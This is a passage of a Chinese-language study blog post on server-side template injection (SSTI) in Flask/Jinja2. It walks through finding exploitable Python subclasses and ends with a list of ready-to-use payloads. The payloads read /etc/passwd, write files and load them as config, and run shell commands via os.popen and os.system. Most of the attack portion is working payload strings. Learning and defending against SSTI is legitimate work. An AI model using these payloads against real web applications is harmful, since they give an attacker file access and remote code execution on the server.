&#39;_ctypes.CThunkObject&#39;&gt;, &lt;class &#39;_ctypes._CData&#39;&gt;, &lt;class &#39;_ctypes.CField&#39;&gt;, &lt;class &#39;_ctypes.DictRemover&#39;&gt;, &lt;class &#39;ctypes.CDLL&#39;&gt;, &lt;class &#39;ctypes.LibraryLoader&#39;&gt;, &lt;class &#39;gunicorn.sock.BaseSocket&#39;&gt;, &lt;class &#39;gunicorn.arbiter.Arbiter&#39;&gt;, &lt;class &#39;gettext.NullTranslations&#39;&gt;, &lt;class &#39;argparse._AttributeHolder&#39;&gt;, &lt;class &#39;argparse.HelpFormatter._Section&#39;&gt;, &lt;class &#39;argparse.HelpFormatter&#39;&gt;, &lt;class &#39;argparse.FileType&#39;&gt;, &lt;class &#39;argparse._ActionsContainer&#39;&gt;, &lt;class &#39;shlex.shlex&#39;&gt;, &lt;class &#39;ipaddress._IPAddressBase&#39;&gt;, &lt;class &#39;ipaddress._BaseV4&#39;&gt;, &lt;class &#39;ipaddress._IPv4Constants&#39;&gt;, &lt;class &#39;ipaddress._BaseV6&#39;&gt;, &lt;class &#39;ipaddress._IPv6Constants&#39;&gt;, &lt;class &#39;_ssl._SSLContext&#39;&gt;, &lt;class &#39;_ssl._SSLSocket&#39;&gt;, &lt;class &#39;_ssl.MemoryBIO&#39;&gt;, &lt;class &#39;_ssl.Session&#39;&gt;, &lt;class &#39;ssl.SSLObject&#39;&gt;, &lt;class &#39;gunicorn.reloader.InotifyReloader&#39;&gt;, &lt;class &#39;gunicorn.config.Config&#39;&gt;, &lt;class &#39;gunicorn.config.Setting&#39;&gt;, &lt;class &#39;gunicorn.debug.Spew&#39;&gt;, &lt;class &#39;gunicorn.app.base.BaseApplication&#39;&gt;, &lt;class &#39;pickle._Framer&#39;&gt;, &lt;class &#39;pickle._Unframer&#39;&gt;, &lt;class &#39;pickle._Pickler&#39;&gt;, &lt;class &#39;pickle._Unpickler&#39;&gt;, &lt;class &#39;_pickle.Unpickler&#39;&gt;, &lt;class &#39;_pickle.Pickler&#39;&gt;, &lt;class &#39;_pickle.Pdata&#39;&gt;, &lt;class &#39;_pickle.PicklerMemoProxy&#39;&gt;, &lt;class &#39;_pickle.UnpicklerMemoProxy&#39;&gt;, &lt;class &#39;queue.Queue&#39;&gt;, &lt;class &#39;logging.handlers.QueueListener&#39;&gt;, &lt;class &#39;socketserver.BaseServer&#39;&gt;, &lt;class &#39;socketserver.ForkingMixIn&#39;&gt;, &lt;class &#39;socketserver.ThreadingMixIn&#39;&gt;, &lt;class &#39;socketserver.BaseRequestHandler&#39;&gt;, &lt;class &#39;logging.config.ConvertingMixin&#39;&gt;, &lt;class &#39;logging.config.BaseConfigurator&#39;&gt;, &lt;class &#39;gunicorn.glogging.Logger&#39;&gt;, &lt;class &#39;gunicorn.http.unreader.Unreader&#39;&gt;, &lt;class &#39;gunicorn.http.body.ChunkedReader&#39;&gt;, &lt;class &#39;gunicorn.http.body.LengthReader&#39;&gt;, &lt;class &#39;gunicorn.http.body.EOFReader&#39;&gt;, &lt;class &#39;gunicorn.http.body.Body&#39;&gt;, &lt;class &#39;gunicorn.http.message.Message&#39;&gt;, &lt;class &#39;gunicorn.http.parser.Parser&#39;&gt;, &lt;class &#39;gunicorn.http.wsgi.FileWrapper&#39;&gt;, &lt;class &#39;gunicorn.http.wsgi.Response&#39;&gt;, &lt;class &#39;gunicorn.workers.workertmp.WorkerTmp&#39;&gt;, &lt;class &#39;gunicorn.workers.base.Worker&#39;&gt;, &lt;class &#39;_json.Scanner&#39;&gt;, &lt;class &#39;_json.Encoder&#39;&gt;, &lt;class &#39;json.decoder.JSONDecoder&#39;&gt;, &lt;class &#39;json.encoder.JSONEncoder&#39;&gt;, &lt;class &#39;jinja2.utils.MissingType&#39;&gt;, &lt;class &#39;jinja2.utils.LRUCache&#39;&gt;, &lt;class &#39;jinja2.utils.Cycler&#39;&gt;, &lt;class &#39;jinja2.utils.Joiner&#39;&gt;, &lt;class &#39;jinja2.utils.Namespace&#39;&gt;, &lt;class &#39;markupsafe._MarkupEscapeHelper&#39;&gt;, &lt;class &#39;jinja2.nodes.EvalContext&#39;&gt;, &lt;class &#39;jinja2.nodes.Node&#39;&gt;, &lt;class &#39;jinja2.runtime.TemplateReference&#39;&gt;, &lt;class &#39;jinja2.runtime.Context&#39;&gt;, &lt;class &#39;jinja2.runtime.BlockReference&#39;&gt;, &lt;class &#39;jinja2.runtime.LoopContextBase&#39;&gt;, &lt;class &#39;jinja2.runtime.LoopContextIterator&#39;&gt;, &lt;class &#39;jinja2.runtime.Macro&#39;&gt;, &lt;class &#39;jinja2.runtime.Undefined&#39;&gt;, &lt;class &#39;decimal.Decimal&#39;&gt;, &lt;class &#39;decimal.Context&#39;&gt;, &lt;class &#39;decimal.SignalDictMixin&#39;&gt;, &lt;class &#39;decimal.ContextManager&#39;&gt;, &lt;class &#39;numbers.Number&#39;&gt;, &lt;class &#39;jinja2.lexer.Failure&#39;&gt;, &lt;class &#39;jinja2.lexer.TokenStreamIterator&#39;&gt;, &lt;class &#39;jinja2.lexer.TokenStream&#39;&gt;, &lt;class &#39;jinja2.lexer.Lexer&#39;&gt;, &lt;class &#39;jinja2.parser.Parser&#39;&gt;, &lt;class &#39;jinja2.visitor.NodeVisitor&#39;&gt;, &lt;class &#39;jinja2.idtracking.Symbols&#39;&gt;, &lt;class &#39;jinja2.compiler.MacroRef&#39;&gt;, &lt;class &#39;jinja2.compiler.Frame&#39;&gt;, &lt;class &#39;jinja2.environment.Environment&#39;&gt;, &lt;class &#39;jinja2.environment.Template&#39;&gt;, &lt;class &#39;jinja2.environment.TemplateModule&#39;&gt;, &lt;class &#39;jinja2.environment.TemplateExpression&#39;&gt;, &lt;class &#39;jinja2.environment.TemplateStream&#39;&gt;, &lt;class &#39;jinja2.loaders.BaseLoader&#39;&gt;, &lt;class &#39;jinja2.bccache.Bucket&#39;&gt;, &lt;class &#39;jinja2.bccache.BytecodeCache&#39;&gt;, &lt;class &#39;concurrent.futures._base._Waiter&#39;&gt;, &lt;class &#39;concurrent.futures._base._AcquireFutures&#39;&gt;, &lt;class &#39;concurrent.futures._base.Future&#39;&gt;, &lt;class &#39;concurrent.futures._base.Executor&#39;&gt;, &lt;class &#39;multiprocessing.process.BaseProcess&#39;&gt;, &lt;class &#39;array.array&#39;&gt;, &lt;class &#39;multiprocessing.reduction._C&#39;&gt;, &lt;class &#39;multiprocessing.reduction.AbstractReducer&#39;&gt;, &lt;class &#39;multiprocessing.context.BaseContext&#39;&gt;, &lt;class &#39;_multiprocessing.SemLock&#39;&gt;, &lt;class &#39;multiprocessing.util.Finalize&#39;&gt;, &lt;class &#39;multiprocessing.util.ForkAwareThreadLock&#39;&gt;, &lt;class &#39;multiprocessing.connection._ConnectionBase&#39;&gt;, &lt;class &#39;multiprocessing.connection.Listener&#39;&gt;, &lt;class &#39;multiprocessing.connection.SocketListener&#39;&gt;, &lt;class &#39;multiprocessing.connection.ConnectionWrapper&#39;&gt;, &lt;class &#39;concurrent.futures.process._ExceptionWithTraceback&#39;&gt;, &lt;class &#39;concurrent.futures.process._WorkItem&#39;&gt;, &lt;class &#39;concurrent.futures.process._ResultItem&#39;&gt;, &lt;class &#39;concurrent.futures.process._CallItem&#39;&gt;, &lt;class &#39;concurrent.futures.thread._WorkItem&#39;&gt;, &lt;class &#39;asyncio.events.Handle&#39;&gt;, &lt;class &#39;asyncio.events.AbstractServer&#39;&gt;, &lt;class &#39;asyncio.events.AbstractEventLoop&#39;&gt;, &lt;class &#39;asyncio.events.AbstractEventLoopPolicy&#39;&gt;, &lt;class &#39;asyncio.coroutines.CoroWrapper&#39;&gt;, &lt;class &#39;asyncio.futures._TracebackLogger&#39;&gt;, &lt;class &#39;asyncio.futures.Future&#39;&gt;, &lt;class &#39;_asyncio.Future&#39;&gt;, &lt;class &#39;_asyncio.FutureIter&#39;&gt;, &lt;class &#39;TaskStepMethWrapper&#39;&gt;, &lt;class &#39;TaskWakeupMethWrapper&#39;&gt;, &lt;class &#39;asyncio.locks._ContextManager&#39;&gt;, &lt;class &#39;asyncio.locks._ContextManagerMixin&#39;&gt;, &lt;class &#39;asyncio.locks.Event&#39;&gt;, &lt;class &#39;asyncio.protocols.BaseProtocol&#39;&gt;, &lt;class &#39;asyncio.queues.Queue&#39;&gt;, &lt;class &#39;asyncio.streams.StreamWriter&#39;&gt;, &lt;class &#39;asyncio.streams.StreamReader&#39;&gt;, &lt;class &#39;asyncio.subprocess.Process&#39;&gt;, &lt;class &#39;asyncio.transports.BaseTransport&#39;&gt;, &lt;class &#39;asyncio.sslproto._SSLPipe&#39;&gt;, &lt;class &#39;asyncio.unix_events.AbstractChildWatcher&#39;&gt;, &lt;class &#39;jinja2.asyncsupport.AsyncLoopContextIterator&#39;&gt;, &lt;class &#39;werkzeug._internal._Missing&#39;&gt;, &lt;class &#39;werkzeug._internal._DictAccessorProperty&#39;&gt;, &lt;class &#39;werkzeug.utils.HTMLBuilder&#39;&gt;, &lt;class &#39;werkzeug.exceptions.Aborter&#39;&gt;, &lt;class &#39;werkzeug.urls.Href&#39;&gt;, &lt;class &#39;email.message.Message&#39;&gt;, &lt;class &#39;http.client.HTTPConnection&#39;&gt;, &lt;class &#39;mimetypes.MimeTypes&#39;&gt;, &lt;class &#39;werkzeug.serving.WSGIRequestHandler&#39;&gt;, &lt;class &#39;werkzeug.serving._SSLContext&#39;&gt;, &lt;class &#39;werkzeug.serving.BaseWSGIServer&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ImmutableListMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ImmutableDictMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures.UpdateDictMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ViewItems&#39;&gt;, &lt;class &#39;werkzeug.datastructures._omd_bucket&#39;&gt;, &lt;class &#39;werkzeug.datastructures.Headers&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ImmutableHeadersMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures.IfRange&#39;&gt;, &lt;class &#39;werkzeug.datastructures.Range&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ContentRange&#39;&gt;, &lt;class &#39;werkzeug.datastructures.FileStorage&#39;&gt;, &lt;class &#39;urllib.request.Request&#39;&gt;, &lt;class &#39;urllib.request.OpenerDirector&#39;&gt;, &lt;class &#39;urllib.request.BaseHandler&#39;&gt;, &lt;class &#39;urllib.request.HTTPPasswordMgr&#39;&gt;, &lt;class &#39;urllib.request.AbstractBasicAuthHandler&#39;&gt;, &lt;class &#39;urllib.request.AbstractDigestAuthHandler&#39;&gt;, &lt;class &#39;urllib.request.URLopener&#39;&gt;, &lt;class &#39;urllib.request.ftpwrapper&#39;&gt;, &lt;class &#39;werkzeug.wrappers.accept.AcceptMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.auth.AuthorizationMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.auth.WWWAuthenticateMixin&#39;&gt;, &lt;class &#39;werkzeug.wsgi.ClosingIterator&#39;&gt;, &lt;class &#39;werkzeug.wsgi.FileWrapper&#39;&gt;, &lt;class &#39;werkzeug.wsgi._RangeWrapper&#39;&gt;, &lt;class &#39;werkzeug.formparser.FormDataParser&#39;&gt;, &lt;class &#39;werkzeug.formparser.MultiPartParser&#39;&gt;, &lt;class &#39;werkzeug.wrappers.base_request.BaseRequest&#39;&gt;, &lt;class &#39;werkzeug.wrappers.base_response.BaseResponse&#39;&gt;, &lt;class &#39;werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.etag.ETagRequestMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.etag.ETagResponseMixin&#39;&gt;, &lt;class &#39;werkzeug.useragents.UserAgentParser&#39;&gt;, &lt;class &#39;werkzeug.useragents.UserAgent&#39;&gt;, &lt;class &#39;werkzeug.wrappers.user_agent.UserAgentMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.request.StreamOnlyMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.response.ResponseStream&#39;&gt;, &lt;class &#39;werkzeug.wrappers.response.ResponseStreamMixin&#39;&gt;, &lt;class &#39;http.cookiejar.Cookie&#39;&gt;, &lt;class &#39;http.cookiejar.CookiePolicy&#39;&gt;, &lt;class &#39;http.cookiejar.Absent&#39;&gt;, &lt;class &#39;http.cookiejar.CookieJar&#39;&gt;, &lt;class &#39;werkzeug.test._TestCookieHeaders&#39;&gt;, &lt;class &#39;werkzeug.test._TestCookieResponse&#39;&gt;, &lt;class &#39;werkzeug.test.EnvironBuilder&#39;&gt;, &lt;class &#39;werkzeug.test.Client&#39;&gt;, &lt;class &#39;uuid.UUID&#39;&gt;, &lt;class &#39;itsdangerous._json._CompactJSON&#39;&gt;, &lt;class &#39;hmac.HMAC&#39;&gt;, &lt;class &#39;itsdangerous.signer.SigningAlgorithm&#39;&gt;, &lt;class &#39;itsdangerous.signer.Signer&#39;&gt;, &lt;class &#39;itsdangerous.serializer.Serializer&#39;&gt;, &lt;class &#39;itsdangerous.url_safe.URLSafeSerializerMixin&#39;&gt;, &lt;class &#39;flask._compat._DeprecatedBool&#39;&gt;, &lt;class &#39;werkzeug.local.Local&#39;&gt;, &lt;class &#39;werkzeug.local.LocalStack&#39;&gt;, &lt;class &#39;werkzeug.local.LocalManager&#39;&gt;, &lt;class &#39;werkzeug.local.LocalProxy&#39;&gt;, &lt;class &#39;difflib.SequenceMatcher&#39;&gt;, &lt;class &#39;difflib.Differ&#39;&gt;, &lt;class &#39;difflib.HtmlDiff&#39;&gt;, &lt;class &#39;werkzeug.routing.RuleFactory&#39;&gt;, &lt;class &#39;werkzeug.routing.RuleTemplate&#39;&gt;, &lt;class &#39;werkzeug.routing.BaseConverter&#39;&gt;, &lt;class &#39;werkzeug.routing.Map&#39;&gt;, &lt;class &#39;werkzeug.routing.MapAdapter&#39;&gt;, &lt;class &#39;click._compat._FixupStream&#39;&gt;, &lt;class &#39;click._compat._AtomicFile&#39;&gt;, &lt;class &#39;click.utils.LazyFile&#39;&gt;, &lt;class &#39;click.utils.KeepOpenFile&#39;&gt;, &lt;class &#39;click.utils.PacifyFlushWrapper&#39;&gt;, &lt;class &#39;click.types.ParamType&#39;&gt;, &lt;class &#39;click.parser.Option&#39;&gt;, &lt;class &#39;click.parser.Argument&#39;&gt;, &lt;class &#39;click.parser.ParsingState&#39;&gt;, &lt;class &#39;click.parser.OptionParser&#39;&gt;, &lt;class &#39;click.formatting.HelpFormatter&#39;&gt;, &lt;class &#39;click.core.Context&#39;&gt;, &lt;class &#39;click.core.BaseCommand&#39;&gt;, &lt;class &#39;click.core.Parameter&#39;&gt;, &lt;class &#39;flask.signals.Namespace&#39;&gt;, &lt;class &#39;flask.signals._FakeSignal&#39;&gt;, &lt;class &#39;flask.helpers.locked_cached_property&#39;&gt;, &lt;class &#39;flask.helpers._PackageBoundObject&#39;&gt;, &lt;class &#39;flask.cli.DispatchingApp&#39;&gt;, &lt;class &#39;flask.cli.ScriptInfo&#39;&gt;, &lt;class &#39;flask.config.ConfigAttribute&#39;&gt;, &lt;class &#39;flask.ctx._AppCtxGlobals&#39;&gt;, &lt;class &#39;flask.ctx.AppContext&#39;&gt;, &lt;class &#39;flask.ctx.RequestContext&#39;&gt;, &lt;class &#39;flask.json.tag.JSONTag&#39;&gt;, &lt;class &#39;flask.json.tag.TaggedJSONSerializer&#39;&gt;, &lt;class &#39;flask.sessions.SessionInterface&#39;&gt;, &lt;class &#39;werkzeug.wrappers.json._JSONModule&#39;&gt;, &lt;class &#39;werkzeug.wrappers.json.JSONMixin&#39;&gt;, &lt;class &#39;flask.blueprints.BlueprintSetupState&#39;&gt;&quot;
+str=str.split(&quot;,&quot;)
+for i in str:
+    if &quot;catch_warnings&quot; in i:
+       # print(i)
+        print (str.index(i))
+</code></pre>
+<p>运行脚本得到<code>&lt;class &#39;warnings.catch_warnings&#39;&gt;</code>在列表的166位置</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211217103947375.png" alt="image-20211217103947375"></p>
+<p>所以这一步的payload为：</p>
+<pre><code class="python">?name=&#123;&#123;''.__class__.__mro__[1].__subclasses__()[166]&#125;&#125;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211217104135330.png" alt="image-20211217104135330"></p>
+<h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><p>找到重载过的<strong>init</strong>类（在获取初始化属性后，带 wrapper 的说明没有重载，寻找不带 warpper 的）：</p>
+<pre><code class="python">?name=&#123;&#123;''.__class__.__mro__[1].__subclasses__()[166].__init__&#125;&#125;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211217104732910.png" alt="image-20211217104732910"></p>
+<h3 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h3><p>查看其引用 <strong>builtins</strong></p>
+<p>Python 程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于 builtins 却不用导入，它在任何模块都直接可见，所以这里直接调用引用的模块。</p>
+<pre><code class="python">?name=&#123;&#123;''.__class__.__mro__[1].__subclasses__()[166].__init__.__globals__['__builtins__']&#125;&#125;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211217105126261.png" alt="image-20211217105126261"></p>
+<p>这里返回的是字典，里面有许多常用的函数,如果存在，直接调用即可</p>
+<p>使用 keys 中的 file 以实现读取文件的功能：</p>
+<pre><code class="python">?name=&#123;&#123;''.__class__.__mro__[1].__subclasses__()[166].__init__.__globals__['__builtins__'].['file']('F://GetFlag.txt').read()&#125;&#125;
+</code></pre>
+<pre><code class="python">?name=&#123;&#123;''.__class__.__mro__[1].__subclasses__()[166].__init__.__globals__['__builtins__'].['file']('/etc/passwd').read()&#125;&#125;
+</code></pre>
+<p>写文件</p>
+<pre><code class="python">?name=&#123;&#123;''.__class__.__mro__[1].__subclasses__()[166].__init__.__globals__['__builtins__'].['file']('/etc/passwd').write()&#125;&#125;
+</code></pre>
+<p>存在的子模块可以通过 .index() 来进行查询，如果存在的话返回索引，直接调用即可。（这里我还没有搞懂）</p>
+<p>还有另外的方法：</p>
+<pre><code class="python">[].__class__.__base__.__subclasses__()[40](&#39;/etc/passwd&#39;).read()
+</code></pre>
+<p>写文件换为 .write() 即可。</p>
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><ul>
+<li>利用eval进行命令执行。</li>
+</ul>
+<pre><code class="python">?name=&#123;&#123;''.__class__.__mro__[1].__subclasses__()[166].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")&#125;&#125;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211217111206867.png" alt="image-20211217111206867"></p>
+<ul>
+<li>利用warnings.catch_warnings 进行命令执行。</li>
+</ul>
+<p>首先，查看 warnings.catch_warnings 方法的位置：</p>
+<pre><code class="python">[].__class__.__base__.__subclasses__().index(warnings.catch_warnings)
+</code></pre>
+<p>查看 linecatch 的位置：</p>
+<pre><code class="python">[].__class__.__base__.__subclasses__()[59].__init__.__globals__.keys().index(&#39;linecache&#39;)
+</code></pre>
+<p>查找 os 模块的位置：</p>
+<pre><code class="python">[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__.keys().index(&#39;os&#39;)
+</code></pre>
+<p>查找 system 方法的位置：</p>
+<pre><code class="python">[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__.values()[12].__dict__.keys().index(&#39;system&#39;)
+</code></pre>
+<p>调用 system 方法：</p>
+<pre><code class="python">[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__.values()[12].__dict__.values()[144](&#39;whoami&#39;)
+</code></pre>
+<ul>
+<li>利用 commands 进行命令执行。</li>
+</ul>
+<pre><code class="python">&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;commands&#39;).getstatusoutput(&#39;ls&#39;)
+
+
+&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).system(&#39;ls&#39;)
+
+
+&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()
+</code></pre>
+<h2 id="官方payload"><a href="#官方payload" class="headerlink" title="官方payload"></a>官方payload</h2><pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;
+&#123;% if c.__name__ == 'catch_warnings' %&#125;
+  &#123;% for b in c.__init__.__globals__.values() %&#125;
+  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;
+    &#123;% if 'eval' in b.keys() %&#125;
+      &#123;&#123; b['eval']('__import__("os").popen("id").read()') &#125;&#125;
+    &#123;% endif %&#125;
+  &#123;% endif %&#125;
+  &#123;% endfor %&#125;
+&#123;% endif %&#125;
+&#123;% endfor %&#125;
+</code></pre>
+<h2 id="常用的ssti—payload"><a href="#常用的ssti—payload" class="headerlink" title="常用的ssti—payload"></a>常用的ssti—payload</h2><h2 id="python2："><a href="#python2：" class="headerlink" title="python2："></a>python2：</h2><pre><code class="python">#文件读取和写入
+&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()&#125;&#125;  
+
+&#123;&#123;''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()&#125;&#125;  
+
+#每次执行都要先写然后编译执行
+&#123;&#123;''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg','w').write('code')&#125;&#125;  
+&#123;&#123; config.from_pyfile('/tmp/owned.cfg') &#125;&#125;  
+
+#命令执行
+&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['eval']('1+1')&#125;&#125;  
+
+&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['eval']("__import__('os').system('whoami')")&#125;&#125;
+
+#这条指令可以注入，但是如果直接进入python2打这个poc，会报错，用下面这个就不会，可能是python启动会加载了某些模块
+&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['eval']("__import__('os').popen('whoami').read()")&#125;&#125;
+
+#system函数换为popen(&#39;&#39;).read()，需要导入os模块
+&#123;&#123;''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")&#125;&#125;
+
+#不需要导入os模块，直接从别的模块调用
+&#123;&#123;().__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()&#125;&#125;
+</code></pre>
+<h2 id="python3"><a href="#python3" class="headerlink" title="python3"></a>python3</h2><pre><code class="python">#读文件
+&#123;&#123;().__class__.__bases__[0].__subclasses__()[177].__init__.__globals__.__builtins__['open']('d://whale.txt').read()&#125;&#125;
+
+#命令执行
+&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['eval']("__import__('os').popen('whoami').read()")&#125;&#125;
+
+#命令执行（变种）
+&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123;c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
+
+#读文件（变种）
+&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('filename', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
+</code></pre>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Tree</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2021/12/16/ssti%E5%AD%A6%E4%B9%A0/">http://example.com/2021/12/16/ssti学习/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Tree's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web/">web</a></div><div class="post_share"><div class="social-share" data-image="https://raw.githubusercontent.com/todis21/image/main/img/wallhaven-4yy7e7_1920x1080.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/12/19/DC-1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/" title="DC-1靶场练习"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/img/wallhaven-6ol7yl_1920x1080.png" onerror="onerror=null;src='/img/404.png'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">DC-1靶场练习</div></div></a></div><div class="next-post pull-right"><a href="/2021/12/13/joomla-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2015-8562/" title="joomla 反序列化漏洞(CVE-2015-8562)"><img class="cover" src="https://w.wallhaven.cc/full/q2/wallhaven-q2pe2l.jpg" onerror="onerror=null;src='/img/404.png'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">joomla 反序列化漏洞(CVE-2015-8562)</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/05/26/sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/" title="s q l注入小结"><img class="cover" src="https://browser9.qhimg.com/bdr/__85/t01c3dca97966573c74.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-05-26</div><div class="title">s q l注入小结</div></div></a></div><div><a href="/2022/02/17/xss-labs%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/" title="xss-labs靶场练习"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/img/wallhaven-wqllpx_1920x1080.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-02-17</div><div class="title">xss-labs靶场练习</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/favicon.jfif" onerror="this.onerror=null;this.src='/img/404.png'" alt="avatar"/></div><div class="author-info__name">Tree</div><div class="author-info__description">随便都行都可以</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">39</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/todis21"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/todis21" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:3440848736@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ssti%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.</span> <span class="toc-text">ssti学习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E9%AA%8C"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞检验</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%A5%97%E8%B7%AF"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞利用套路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5"><span class="toc-number">1.3.1.</span> <span class="toc-text">第一步</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5"><span class="toc-number">1.3.2.</span> <span class="toc-text">第二步</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5"><span class="toc-number">1.3.3.</span> <span class="toc-text">第三步</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E6%AD%A5"><span class="toc-number">1.3.4.</span> <span class="toc-text">第四步</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" 